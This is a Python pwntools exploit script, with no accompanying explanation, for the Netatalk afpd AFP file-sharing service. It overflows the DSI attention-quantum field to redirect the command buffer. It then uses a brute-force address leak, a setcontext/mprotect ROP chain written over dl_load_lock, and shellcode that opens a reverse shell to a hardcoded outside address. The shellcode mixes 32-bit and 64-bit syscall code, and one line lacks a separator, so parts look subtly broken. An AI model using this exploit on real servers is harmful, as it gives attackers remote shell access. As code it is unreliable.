#!/usr/bin/env python
import sys, os
from pwn import *
from time import sleep

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 548)
elf = ELF('afpd'); context.arch = elf.arch
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def do_exploit(r, addr):
    '''
    uint32_t attn_quantum, datasize, server_quantum;
    uint16_t serverID, clientID;
    uint8_t  *commands; /* DSI recieve buffer */    <- overwrite this
    '''

    # overflow payload
    payload =  flat(
        p32(0xddaa), # quantum must > 32000
        p32(0), p32(0x5566), p16(0) * 2,
        addr         # commands
    )

    # pack to dsi command format
    dsi_command = flat(
        p8(1),  # DSIOPT_ATTNQUANT
        p8(len(payload)), payload
    )

    # pack to dsi packet format
    '''
    struct dsi_block {
        uint8_t dsi_flags;       /* packet type: request or reply */
        uint8_t dsi_command;     /* command */
        uint16_t dsi_requestID;  /* request ID */
        union {
            uint32_t dsi_code;   /* error code */
            uint32_t dsi_doff;   /* data offset */
        } dsi_data;
        uint32_t dsi_len;        /* total data length */
        uint32_t dsi_reserved;   /* reserved field */
    };
    '''

    dsi_block = flat(
        p8(0), p8(4), p16(1, endianness='big'),
        p32(0), p32(len(dsi_command), endianness='big'), p32(0)
    )

    r.send(dsi_block + dsi_command)
    r.recv()

def send_request(payload):
    '''
    #define DSIFUNC_CLOSE   1       /* DSICloseSession */
    #define DSIFUNC_CMD     2       /* DSICommand */
    #define DSIFUNC_STAT    3       /* DSIGetStatus */
    #define DSIFUNC_OPEN    4       /* DSIOpenSession */
    #define DSIFUNC_TICKLE  5       /* DSITickle */
    #define DSIFUNC_WRITE   6       /* DSIWrite */
    #define DSIFUNC_ATTN    8       /* DSIAttention */
    #define DSIFUNC_MAX     8       /* largest command */
    '''

    dsi_block = flat(
        p8(0), p8(1), p16(0, endianness='big'),     # send DSICloseSession to trigger `exit`
        p32(0), p32(len(payload), endianness='big'), p32(0)
    )

    r.send(dsi_block)   # dsi_buffered_stream_read
    r.send(payload)     # dsi_stream_read

def bruteforce(cnt, lower, prompt, shift=0, desc=False):
    print "bruteforce"
    l = log.progress(prompt)
    # print range(cnt) if not desc else range(cnt)[::-1]
    for i in range(cnt):
        _ = lower + chr(i << shift)
        with context.local(log_level='ERROR'):
            r = remote(HOST, PORT)
        try:
            do_exploit(r, _)
            l.success(hex(u64(_.ljust(8, '\x00'))))
            return i
        except:
            l.status(hex(u64(_.ljust(8, '\x00'))))
        finally:
            with context.local(log_level='ERROR'):
                r.close()

    print 'failed'
    sys.exit(1)


# ld_off = 0x119000 # depend on Linux kernel version
# buf = 0

# leak = bruteforce(16, p8(0), 'buf & 0xf000', 4) #  0xa000
# buf |= leak << (8 + 4)
# ld_buf = (buf + (ld_off & 0xf000)) & 0xffff

# leak = bruteforce(256, p16(ld_buf), 'ld_buf', desc=True) #  0x223000
# ld_buf |= leak << 16

# leak = bruteforce(256, p32(ld_buf)[:3], 'ld_buf', desc=True) #  0xad223000
# ld_buf |= leak << 24

# leak = bruteforce(256, p32(ld_buf), 'ld_buf', desc=True) #  0xdead223000
# ld_buf |= leak << 32

# leak = bruteforce(0x80, p64(ld_buf)[:5], 'ld_buf', desc=True) # #  0x7fdead223000
# ld_buf |= leak << 40

ld_buf = 0x7fdead223000
ld_base = ld_buf - 0x229000
log.info('ld_base: {}'.format(hex(ld_base)))

libc_base = ld_buf - 0xed3000
log.info('libc_base: {}'.format(hex(libc_base)))
libc.address = libc_base

r = remote(HOST, PORT)

# overwrite dsi->commands to dl_load_lock
dl_load_lock = ld_base + 0x228968
do_exploit(r, dl_load_lock)

sc_addr = dl_load_lock + 0x200
rop_addr = dl_load_lock + 0x100

# mprotect(addr, length, RWX)
ret = libc_base + 0x21354
sc_page = sc_addr & 0xffffffffffff000
setcontext_args = flat(
    'a'*0x28,                      # padding
    0, 0, 0, 0, 0, 0, 0, 0,        # r8, r9, x, x, r12, r13, r14, r15
    sc_page, 0x1000, 0, 0, 7, 0,   # rdi, rsi, rbp, rbx, rdx, x
    0, rop_addr, ret,              # rcx, rsp, rip
)

# reverse shell
sc = asm(
    "push 1; dec byte ptr [esp]; push 1; push 2; push SYS_socketcall;" + 
    "pop eax; push SYS_socketcall_socket; pop ebx; mov ecx, esp; int 0x80;" + 
    "mov edx, eax; push -0x53b28d74; push 0x1010101; xor dword ptr [esp], 0xd3050103;" + 
    "mov ecx, esp; push 0x10; push ecx; push edx; push SYS_socketcall; pop eax" + 
    "push SYS_socketcall_connect; pop ebx; mov ecx, esp; int 0x80;" +
    'push rbp; pop rdi; xor esi, esi; push SYS_dup2; pop rax; syscall;' +
    'push rbp; pop rdi; push 1; pop rsi; push SYS_dup2; pop rax; syscall;' +
    'push rbp; pop rdi; push 2; pop rsi; push SYS_dup2; pop rax; syscall;' +
    "push 0x1010101; xor dword ptr [esp], 0x169722e; push 0x6e69622f;" + 
    "mov ebx, esp; xor ecx, ecx; xor edx, edx;" + 
    "push SYS_execve; pop eax; int 0x80;"
)
rop = flat(libc.sym['mprotect'], sc_addr)

# read setcontext_args, rop chain, shellcode to dl_load_lock, then overwrite dl_rtld_lock_recursive
_ = setcontext_args.ljust(0x100) + rop.ljust(0x100) + sc
_ = _.ljust(0x5f8) + p64(libc.sym['setcontext'] + 53)

send_request(_)
r.close()
